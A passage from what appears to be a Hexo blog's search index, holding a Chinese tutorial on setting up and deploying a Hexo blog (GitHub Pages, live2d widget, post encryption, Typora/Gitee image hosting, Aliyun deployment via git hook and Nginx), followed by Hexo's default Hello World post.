class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">server:<br>  port: 4001 <span class="hljs-comment">#端口号随意，默认是4000</span><br>  compress: <span class="hljs-literal">true</span><br>  header: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>进入目录，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g -d<br></code></pre></td></tr></table></figure><p>会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ERROR Deployer not found: git<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>重新执行<code>hexo g -d</code>，在弹出的框子中，输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令行也输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="网站效果"><a href="#网站效果" class="headerlink" title="网站效果"></a>网站效果</h2><p>访问：<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><p>方法一：新建一个空文章，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo n <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p>如：执行<code>hexo new &quot;My New Post&quot;</code>，会在项目 <code>\Hexo\source\_posts</code> 中生成 My New Post.md 文件，可以进行编辑。</p><p>方法二：也可以在项目 <code>\Hexo\source\_posts</code>下，新建md 文件，然后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 文章标题<br><span class="hljs-built_in">date</span>: 时间，如2020-02-02 02:02:02<br>categories: 类别<br>tags:  标签<br></code></pre></td></tr></table></figure><p>在md文章中添加下面的句子，该句子以上可以显示你想显示的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- more --&gt;<br></code></pre></td></tr></table></figure><p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ hexo g -d<br></code></pre></td></tr></table></figure><h1 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h1><h2 id="添加看板娘"><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h2><p>1、安装模块<br> 在hexo根目录执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-helper-live2d<br></code></pre></td></tr></table></figure><p>可以在<code>package.json</code>查看是否安装成功<br><img src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时再去 node_moduels目录下，可以看到有如下文件夹，这些都是动画主配置<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="在这里插入图片描述"></p><p>2、下载模型<br>地址：<a href="https://github.com/xiazeyu/live2d-widget-models.git">https://github.com/xiazeyu/live2d-widget-models.git</a></p><p>下载好之后将<code>packages</code>里的所有动画模板拷贝到博客的<code>node_modules</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d-widget-model-chitose<br>live2d-widget-model-epsilon2_1<br>live2d-widget-model-gf<br>live2d-widget-model-haru<br>live2d-widget-model-haruto<br>live2d-widget-model-hibiki<br>live2d-widget-model-hijiki<br>live2d-widget-model-izumi<br>live2d-widget-model-koharu<br>live2d-widget-model-miku<br>live2d-widget-model-ni-j<br>live2d-widget-model-nico<br>live2d-widget-model-nietzsche<br>live2d-widget-model-nipsilon<br>live2d-widget-model-nito<br>live2d-widget-model-shizuku<br>live2d-widget-model-tororo<br>live2d-widget-model-tsumiki<br>live2d-widget-model-unitychan<br>live2d-widget-model-wanko<br>live2d-widget-model-z16<br></code></pre></td></tr></table></figure><p>也可以挑选自己喜欢的模型，使用命令安装模型，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install live2d-widget-model-haruto<br></code></pre></td></tr></table></figure><p>4.详细配置<br>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  pluginModelPath: assets/<br>  model:<br>    use: live2d-widget-model-haruto  <br>    <span class="hljs-comment">#模板目录，在node_modules里，这里是模型名称</span><br>  display:<br>    position: right<br>    width: 150 <br>    height: 300<br>  mobile:<br>    show: <span class="hljs-literal">false</span>  <span class="hljs-comment">#是否在手机进行显示</span><br></code></pre></td></tr></table></figure><h2 id="博客加密"><a href="#博客加密" class="headerlink" title="博客加密"></a>博客加密</h2><p>1.安装encrypt插件<br>在博客目录下执行下面的指令安装encrypt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-blog-encrypt<br></code></pre></td></tr></table></figure><p>安装完成后，在package.json文件的dependecies依赖中看到encrypt插件<br><img src="https://img-blog.csdnimg.cn/20210205121402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 . 加密文章设置<br>将”password”字段添加到文章信息头部：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 文章标题<br><span class="hljs-built_in">date</span>: 时间，如2020-02-02 02:02:02<br>categories: 类别<br>tags:  标签<br>password: 123456<br>abstract: 这里有东西被加密了，需要输入密码查看哦。<br>message: 您好，这里需要密码。<br>wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。<br>wrong_hash_message: 抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。<br></code></pre></td></tr></table></figure><p>效果图<br><img src="https://img-blog.csdnimg.cn/202102051217264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Typora-Gitee搭建图床"><a href="#Typora-Gitee搭建图床" class="headerlink" title="Typora + Gitee搭建图床"></a>Typora + Gitee搭建图床</h1><p>把图片拖进 md 编辑器，图片会自动上传到图床，上传成功图片顶部会出现绿色背景的白字进行提醒。该插件支持、GitHub、七牛云、阿里云、码云等。</p><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Typora 版本：0.9.68 (Windows x86)<br>下载地址：https://typora.io/windows/typora-update-ia32-0320.exe<br>Typora安装目录：D:\Program Files\Typora ，或者安装在其他目录<br></code></pre></td></tr></table></figure><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>覆盖安装的方式在某些特定版本下会触发bug，建议按照这个 issue 中的方法修改 window.html 文件而不是直接覆盖它，plugins 是新增目录不存在覆盖的问题。</p><ol><li>下载插件代码</li><li>复制插件相关代码文件：window.html、plugins；</li><li>将复制的插件代码文件，粘贴到typora安装目录下的 resources\app 文件夹下；</li><li>安装完成，重启typora</li></ol><h2 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h2><p>插件默认会将图片上传到个人站点上（街边价），不能保证一直给大家提供服务，所以按照好插件后，强烈建议你换成自己的图片上传服务器。</p><p>更换图片上传接口地址，打开 plugins/image/upload.js 文件，拉到最下面 将最后一行的 $.image.init(); 按照下面的说明进行配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">上传到码云<br><br>// ！！！注意当图片大于1M时， gitee 必须登录后才能查看！！！<br>$.image.init(&#123;<br>    target:<span class="hljs-string">&#x27;gitee&#x27;</span>,<br>    gitee: &#123;<br>            message: <span class="hljs-string">&quot;From:https://github.com/Thobian&quot;</span>,     // 必须参数,提交消息（默认为：add image）<br>            branch: <span class="hljs-string">&quot;master&quot;</span>,                               // 要提交到的分支（默认为：master）<br>            token: <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>,   // 码云token申请地址 https://gitee.com/profile/personal_access_tokens<br>            userName: <span class="hljs-string">&#x27;userName&#x27;</span>,                           // 用户名 比如你的gitee个人主页地址是：https://gitee.com/thobian ，那userName就是：thobian<br>            repositorie: <span class="hljs-string">&#x27;repositorie&#x27;</span>,                     // 仓库名 比如你的gitee图片仓库地址是：https://gitee.com/thobian/typora，那么repositorie就是 typora<br>            Folder: <span class="hljs-string">&#x27;image&#x27;</span>,                                // 可以把上传的图片都放到这个指定的文件夹下<br>            BucketDomain: <span class="hljs-string">&#x27;https://gitee.com/api/v5/repos/&#x27;</span>,// 这个是不用变的，直接copy就好<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="部署到阿里云服务器"><a href="#部署到阿里云服务器" class="headerlink" title="部署到阿里云服务器"></a>部署到阿里云服务器</h1><h2 id="创建私有-Git-仓库"><a href="#创建私有-Git-仓库" class="headerlink" title="创建私有 Git 仓库"></a>创建私有 Git 仓库</h2><p>安装Git，Git 用于版本管理和部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install git-core <br></code></pre></td></tr></table></figure><p>在 /var/repo/ 下，创建一个名为 hexo_static 的裸仓库,然后需要修改用户对目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> /var/repo/<br>sudo <span class="hljs-built_in">chown</span> -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/repo/<br>sudo <span class="hljs-built_in">chmod</span> -R 755 /var/repo/<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/repo/<br>git init --bare hexo_static.git<br></code></pre></td></tr></table></figure><h2 id="配置Nginx托管文件目录"><a href="#配置Nginx托管文件目录" class="headerlink" title="配置Nginx托管文件目录"></a>配置Nginx托管文件目录</h2><p>安装Nginx ，用于静态博客托管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install nginx<br></code></pre></td></tr></table></figure><p>创建 /var/www/hexo 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /var/www/hexo<br></code></pre></td></tr></table></figure><p>修改目录的所有权和权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chown</span> -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/www/hexo<br>sudo <span class="hljs-built_in">chmod</span> -R 755 /var/www/hexo<br></code></pre></td></tr></table></figure><p>修改 Nginx 的 default 设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/nginx/sites-available/default<br></code></pre></td></tr></table></figure><p>将root 指向 <code>/var/www/hexo</code> 目录，修改内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">server &#123;<br>    listen 80 default_server;<br>    listen [::]:80 default_server;<br><br>    root /var/www/hexo; <span class="hljs-comment"># 需要修改的部分</span><br>    index index.html index.htm;<br></code></pre></td></tr></table></figure><p>然后重启 Nginx 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo service nginx restart<br></code></pre></td></tr></table></figure><h2 id="配置git-hooks"><a href="#配置git-hooks" class="headerlink" title="配置git hooks"></a>配置git hooks</h2><p>在hooks文件中创建post-receive文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><p>添加内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>git --work-tree=/var/www/hexo --git-dir=/var/repo/hexo_static.git checkout -f<br></code></pre></td></tr></table></figure><p>将此文件设置成可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>修改_config.yml配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># URL</span><br><span class="hljs-comment">## If your site is put in a subdirectory, set url as &#x27;http://example.com/child&#x27; and root as &#x27;/child/&#x27;</span><br>url: http://服务器IP<br><br>deploy:<br>    <span class="hljs-built_in">type</span>: git<br>    repo: root@服务器IP:/var/repo/hexo_static<br>    branch: master<br></code></pre></td></tr></table></figure><p>将本地内容上传云服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g -d<br></code></pre></td></tr></table></figure><p>第一次会出现下图所示错误<br><img src="https://img-blog.csdnimg.cn/20210407175526299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -R 服务器IP<br></code></pre></td></tr></table></figure><p>再次执行<code>hexo g -d</code>即可成功<br><img src="https://img-blog.csdnimg.cn/20210407180432805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h2><p>添加备案号<br>在主题文件的layout_partial\footer.ejs中添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-comment">&lt;!--添加备案号--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-center&quot;</span>&gt;</span><br>         <span class="hljs-comment">&lt;!--img src=&quot;https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png&quot;--&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://beian.miit.gov.cn/&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:#f72b07&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>备案号<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><p>登录阿里云，并进入控制台，点击左侧菜单中的域名，进入域名管理，选择要解析的域名，点击解析，进入解析设置。点击添加记录<br><img src="https://img-blog.csdnimg.cn/20210422194119910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加记录两条记录值，一个是www，一个是@，记录值阿里云服务器的地址（公）</p><p><img src="https://img-blog.csdnimg.cn/20210422194302611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>注意：本文所有命令均在git<br>命令行使用</strong></p><p>参考文章：<br><a href="https://www.imooc.com/article/313424">Hexo结合Stun静态博客搭建从入门到入土</a><br><a href="https://www.jianshu.com/p/3a6342e16e57">hexo 添加live2d看板动画</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/104221186">记录本地Hexo博客部署到服务器上</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/posts/1243066710/"/>
    <url>/posts/1243066710/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
